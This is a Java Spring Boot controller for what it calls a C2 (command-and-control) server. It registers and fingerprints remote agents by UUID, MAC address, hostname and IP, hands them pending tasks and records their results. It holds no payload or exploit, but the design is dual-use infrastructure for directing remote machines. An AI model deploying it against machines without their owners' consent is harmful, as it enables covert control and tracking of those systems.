package com.yupi.springbootinit.controller;

import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import com.yupi.springbootinit.common.BaseResponse;
import com.yupi.springbootinit.common.ResultUtils;
import com.yupi.springbootinit.mapper.C2TaskMapper;
import com.yupi.springbootinit.mapper.C2DeviceMapper;
import com.yupi.springbootinit.model.entity.C2Task;
import com.yupi.springbootinit.model.entity.C2Device;
import com.yupi.springbootinit.utils.NetUtils;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.*;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import java.util.Date;
import java.util.List;
import java.util.Map;
import java.util.UUID;

/**
 * C2 Controller (Agent Communication)
 */
@RestController
@Slf4j
public class C2Controller {

    @Resource
    private C2TaskMapper c2TaskMapper;

    @Resource
    private C2DeviceMapper c2DeviceMapper;

    @PostMapping("/heartbeat")
    public String heartbeat(@RequestBody Map<String, Object> payload, HttpServletRequest request) {
        // Record heartbeat
        recordHeartbeat(payload, request);
        return "alive";
    }

    @PostMapping("/c2/tasks/pending")
    public Map<String, Object> getPendingTasks(@RequestBody(required = false) Map<String, Object> payload, HttpServletRequest request) {
        // Record heartbeat (legacy support or just ip)
        C2Device device = recordHeartbeat(payload, request);
        
        QueryWrapper<C2Task> queryWrapper = new QueryWrapper<>();
        queryWrapper.eq("status", "pending");
        // Filter by deviceId if possible, or broadcast (deviceId is null)
        if (device != null) {
            queryWrapper.and(qw -> qw.eq("deviceId", device.getId()).or().isNull("deviceId"));
        } else {
             queryWrapper.isNull("deviceId");
        }
        
        List<C2Task> tasks = c2TaskMapper.selectList(queryWrapper);
        
        Map<String, Object> response = new java.util.HashMap<>();
        response.put("tasks", tasks);
        // Default 60000ms if null
        response.put("heartbeatInterval", device != null && device.getHeartbeatInterval() != null ? device.getHeartbeatInterval() : 60000);
        
        return response;
    }

    @PostMapping("/c2/tasks/result")
    public BaseResponse<Boolean> submitTaskResult(@RequestBody Map<String, Object> payload, HttpServletRequest request) {
        recordHeartbeat(payload, request); // Pass payload to update heartbeat info
        String taskId = (String) payload.get("taskId");
        String result = (String) payload.get("result");
        String status = (String) payload.get("status"); // Support status update

        if (taskId != null) {
            QueryWrapper<C2Task> queryWrapper = new QueryWrapper<>();
            queryWrapper.eq("taskId", taskId);
            C2Task task = c2TaskMapper.selectOne(queryWrapper);
            if (task != null) {
                if (result != null) {
                    task.setResult(result);
                }
                if (status != null) {
                    task.setStatus(status);
                } else {
                    task.setStatus("completed"); // Default to completed if not specified
                }
                c2TaskMapper.updateById(task);
            }
        }
        return ResultUtils.success(true);
    }
    
    // Helper to record heartbeat from request
    private C2Device recordHeartbeat(Map<String, Object> payload, HttpServletRequest request) {
        // External IP from request header/remote addr
        String externalIp = NetUtils.getIpAddress(request);
        if ("0:0:0:0:0:0:0:1".equals(externalIp)) {
            externalIp = "127.0.0.1";
        }
        String internalIp = "Unknown";
        String hostName = "Unknown";
        String os = "Unknown";
        String macAddress = null;
        String uuid = null;
        
        // Debug logging
        log.info("Received heartbeat payload: {}", payload);
        
        if (payload != null) {
            if (payload.containsKey("hostName")) {
                hostName = (String) payload.get("hostName");
            }
            if (payload.containsKey("os")) {
                os = (String) payload.get("os");
            }
            if (payload.containsKey("macAddress")) {
                macAddress = (String) payload.get("macAddress");
            }
            if (payload.containsKey("uuid")) {
                uuid = (String) payload.get("uuid");
            }
            // Client reported IP is treated as Internal IP
             if (payload.containsKey("ip")) {
                String clientIp = (String) payload.get("ip");
                if (clientIp != null && !clientIp.isEmpty()) {
                    internalIp = clientIp;
                }
             }
        }

        // Identify by UUID (Most reliable, persistent)
        // Then MAC Address, then Hostname/External IP
        QueryWrapper<C2Device> queryWrapper = new QueryWrapper<>();
        if (uuid != null && !uuid.isEmpty()) {
            queryWrapper.eq("uuid", uuid);
        } else if (macAddress != null && !macAddress.isEmpty()) {
            queryWrapper.eq("macAddress", macAddress);
        } else if (!"Unknown".equals(hostName)) {
            queryWrapper.eq("hostName", hostName);
        } else {
            queryWrapper.eq("externalIp", externalIp);
        }
        
        // Handle potential duplicates or just pick one
        List<C2Device> devices = c2DeviceMapper.selectList(queryWrapper);
        C2Device device = null;
        if (devices != null && !devices.isEmpty()) {
            device = devices.get(0);
        }

        if (device == null) {
            device = new C2Device();
            device.setUuid(uuid); // Save UUID if provided
            device.setExternalIp(externalIp);
            device.setInternalIp(internalIp);
            device.setHostName(hostName);
            device.setOs(os);
            device.setMacAddress(macAddress);
            device.setLastSeen(new Date());
            c2DeviceMapper.insert(device);
        } else {
            device.setLastSeen(new Date());
            // Update info
            if (uuid != null) {
                device.setUuid(uuid); // Update UUID if it was missing/changed (unlikely for same device, but good for migration)
            }
            device.setExternalIp(externalIp);
            if (macAddress != null) {
                device.setMacAddress(macAddress);
            }
            if (!"Unknown".equals(internalIp)) {
                device.setInternalIp(internalIp);
            }
            if (!"Unknown".equals(hostName)) {
                device.setHostName(hostName);
            }
            if (!"Unknown".equals(os)) {
                device.setOs(os);
            }
            c2DeviceMapper.updateById(device);
        }
        return device;
    }
}

